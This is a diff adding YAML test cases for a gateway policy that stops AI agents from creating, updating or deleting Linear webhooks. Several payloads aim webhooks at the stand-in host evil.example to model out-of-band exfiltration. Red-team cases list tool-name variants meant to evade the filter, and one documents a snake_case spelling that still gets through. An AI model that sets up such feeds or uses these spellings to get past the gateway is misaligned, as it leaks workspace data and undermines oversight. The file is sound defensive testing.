@@ -1,0 +1,340 @@
+# Every deny case asserts the single stable reason string.
+- description: Reading existing webhooks (linear_getWebhooks) is allowed — useful for
+    detection and does not mutate the webhook set. Policy should allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: linear_getWebhooks
+      uri: null
+    payload:
+      name: linear_getWebhooks
+      args: {}
+  output:
+    expectedResult: allow
+- description: Unrelated write tool (linear_createIssue) — outside this policy's job;
+    role-gate-writes owns it. Policy should allow.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: linear_createIssue
+      uri: null
+    payload:
+      name: linear_createIssue
+      args:
+        title: Fix login bug
+        teamId: TEAM-1
+  output:
+    expectedResult: allow
+- description: linear_createWebhook — one call opens a standing out-of-band feed of
+    workspace events to an arbitrary URL. Policy should deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: linear_createWebhook
+      uri: null
+    payload:
+      name: linear_createWebhook
+      args:
+        url: https://evil.example/hook
+        resourceTypes:
+          - Issue
+          - Comment
+  output:
+    expectedResult: deny
+    expectedReason: Linear webhooks create a standing outbound feed of workspace events
+      to an external URL that the gateway cannot see or inspect once created — agents
+      are not permitted to create, update, or delete them. Set up integrations through
+      your IT or security-review process instead of via the agent. This attempt has
+      been flagged for security review. Contact your InfoSec team if you believe this
+      block is a mistake.
+- description: linear_updateWebhook — retargeting the callback URL or widening the
+    event scope is the same persistence surface. Policy should deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: linear_updateWebhook
+      uri: null
+    payload:
+      name: linear_updateWebhook
+      args:
+        id: wh_123
+        url: https://evil.example/newhook
+  output:
+    expectedResult: deny
+    expectedReason: Linear webhooks create a standing outbound feed of workspace events
+      to an external URL that the gateway cannot see or inspect once created — agents
+      are not permitted to create, update, or delete them. Set up integrations through
+      your IT or security-review process instead of via the agent. This attempt has
+      been flagged for security review. Contact your InfoSec team if you believe this
+      block is a mistake.
+- description: linear_deleteWebhook — mutating the webhook set is not an agent action.
+    Policy should deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: linear_deleteWebhook
+      uri: null
+    payload:
+      name: linear_deleteWebhook
+      args:
+        id: wh_123
+  output:
+    expectedResult: deny
+    expectedReason: Linear webhooks create a standing outbound feed of workspace events
+      to an external URL that the gateway cannot see or inspect once created — agents
+      are not permitted to create, update, or delete them. Set up integrations through
+      your IT or security-review process instead of via the agent. This attempt has
+      been flagged for security review. Contact your InfoSec team if you believe this
+      block is a mistake.
+- description: Mixed-case tool name (Linear_CreateWebhook) — matching is case-insensitive.
+    Policy should deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: Linear_CreateWebhook
+      uri: null
+    payload:
+      name: Linear_CreateWebhook
+      args: {}
+  output:
+    expectedResult: deny
+    expectedReason: Linear webhooks create a standing outbound feed of workspace events
+      to an external URL that the gateway cannot see or inspect once created — agents
+      are not permitted to create, update, or delete them. Set up integrations through
+      your IT or security-review process instead of via the agent. This attempt has
+      been flagged for security review. Contact your InfoSec team if you believe this
+      block is a mistake.
+- description: createWebhook with args missing entirely — the deny is keyed on the
+    tool name alone and fails closed. Policy should deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: linear_createWebhook
+      uri: null
+    payload:
+      name: linear_createWebhook
+  output:
+    expectedResult: deny
+    expectedReason: Linear webhooks create a standing outbound feed of workspace events
+      to an external URL that the gateway cannot see or inspect once created — agents
+      are not permitted to create, update, or delete them. Set up integrations through
+      your IT or security-review process instead of via the agent. This attempt has
+      been flagged for security review. Contact your InfoSec team if you believe this
+      block is a mistake.
+- description: Privileged-looking caller (admin/infosec groups claim) is still denied
+    — there is deliberately no group exemption on this surface. Policy should deny.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    subject:
+      sub: linear|admin@corp.example
+      claims:
+        groups:
+          - linear-admins
+          - infosec
+    resource:
+      type: tool
+      name: linear_createWebhook
+      uri: null
+    payload:
+      name: linear_createWebhook
+      args:
+        url: https://internal.corp.example/hook
+        resourceTypes:
+          - Issue
+  output:
+    expectedResult: deny
+    expectedReason: Linear webhooks create a standing outbound feed of workspace events
+      to an external URL that the gateway cannot see or inspect once created — agents
+      are not permitted to create, update, or delete them. Set up integrations through
+      your IT or security-review process instead of via the agent. This attempt has
+      been flagged for security review. Contact your InfoSec team if you believe this
+      block is a mistake.
+- description: 'Red-team: bare unprefixed tool name (createWebhook, no gateway prefix).
+    Suffix anchoring drops the prefix, so this is still denied.'
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: createWebhook
+      uri: null
+    payload:
+      name: createWebhook
+      args: {}
+  output:
+    expectedResult: deny
+    expectedReason: Linear webhooks create a standing outbound feed of workspace events
+      to an external URL that the gateway cannot see or inspect once created — agents
+      are not permitted to create, update, or delete them. Set up integrations through
+      your IT or security-review process instead of via the agent. This attempt has
+      been flagged for security review. Contact your InfoSec team if you believe this
+      block is a mistake.
+- description: 'Red-team: gateway that joins the prefix with a dot separator
+    (linear.createWebhook) — still caught by the separator-agnostic suffix. Policy
+    should deny.'
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: linear.createWebhook
+      uri: null
+    payload:
+      name: linear.createWebhook
+      args: {}
+  output:
+    expectedResult: deny
+    expectedReason: Linear webhooks create a standing outbound feed of workspace events
+      to an external URL that the gateway cannot see or inspect once created — agents
+      are not permitted to create, update, or delete them. Set up integrations through
+      your IT or security-review process instead of via the agent. This attempt has
+      been flagged for security review. Contact your InfoSec team if you believe this
+      block is a mistake.
+- description: 'Red-team: getWebhooks (read) ends in getwebhooks, not any mutation
+    suffix — reading the webhook list is allowed. Policy should allow.'
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: linear-getWebhooks
+      uri: null
+    payload:
+      name: linear-getWebhooks
+      args: {}
+  output:
+    expectedResult: allow
+- description: 'Red-team (documented residual): a hypothetical snake_case spelling
+    (create_webhook) breaks the camelCase suffix and is NOT matched, so it passes
+    through here. No verified Linear server uses this spelling; the residual is
+    documented in Known limitations and closed by default-deny-unknown-tools (PF-28).
+    Policy allows.'
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: linear_create_webhook
+      uri: null
+    payload:
+      name: linear_create_webhook
+      args:
+        url: https://evil.example/hook
+  output:
+    expectedResult: allow
+- description: 'Red-team (FIXED bypass): GraphQL-native noun-verb ordering
+    (linear_webhookCreate). Linear''s underlying GraphQL mutation is webhookCreate,
+    and tacticlaunch mirrors the GraphQL API — a more literal wrapper would present
+    this spelling. Now matched by the noun-verb suffix. Policy should deny.'
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: linear_webhookCreate
+      uri: null
+    payload:
+      name: linear_webhookCreate
+      args:
+        url: https://evil.example/hook
+        resourceTypes:
+          - Issue
+  output:
+    expectedResult: deny
+    expectedReason: Linear webhooks create a standing outbound feed of workspace events
+      to an external URL that the gateway cannot see or inspect once created — agents
+      are not permitted to create, update, or delete them. Set up integrations through
+      your IT or security-review process instead of via the agent. This attempt has
+      been flagged for security review. Contact your InfoSec team if you believe this
+      block is a mistake.
+- description: 'Red-team (FIXED bypass): noun-verb update ordering (linear_webhookUpdate)
+    — retargeting the callback via the GraphQL-native spelling. Now matched. Policy
+    should deny.'
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: linear_webhookUpdate
+      uri: null
+    payload:
+      name: linear_webhookUpdate
+      args:
+        id: wh_123
+        url: https://evil.example/newhook
+  output:
+    expectedResult: deny
+    expectedReason: Linear webhooks create a standing outbound feed of workspace events
+      to an external URL that the gateway cannot see or inspect once created — agents
+      are not permitted to create, update, or delete them. Set up integrations through
+      your IT or security-review process instead of via the agent. This attempt has
+      been flagged for security review. Contact your InfoSec team if you believe this
+      block is a mistake.
+- description: 'Red-team (FIXED bypass): noun-verb delete ordering with a dot separator
+    and mixed case (linear.WebhookDelete) — separator- and case-agnostic suffix in
+    the noun-verb ordering. Now matched. Policy should deny.'
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: linear.WebhookDelete
+      uri: null
+    payload:
+      name: linear.WebhookDelete
+      args:
+        id: wh_123
+  output:
+    expectedResult: deny
+    expectedReason: Linear webhooks create a standing outbound feed of workspace events
+      to an external URL that the gateway cannot see or inspect once created — agents
+      are not permitted to create, update, or delete them. Set up integrations through
+      your IT or security-review process instead of via the agent. This attempt has
+      been flagged for security review. Contact your InfoSec team if you believe this
+      block is a mistake.
+- description: 'Red-team: getWebhooks (read) must stay allowed after adding noun-verb
+    suffixes — getwebhooks ends in none of createwebhook/webhookcreate/etc. Reading
+    the webhook list is still allowed. Policy should allow.'
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: linear_getWebhooks
+      uri: null
+    payload:
+      name: linear_getWebhooks
+      args: {}
+  output:
+    expectedResult: allow
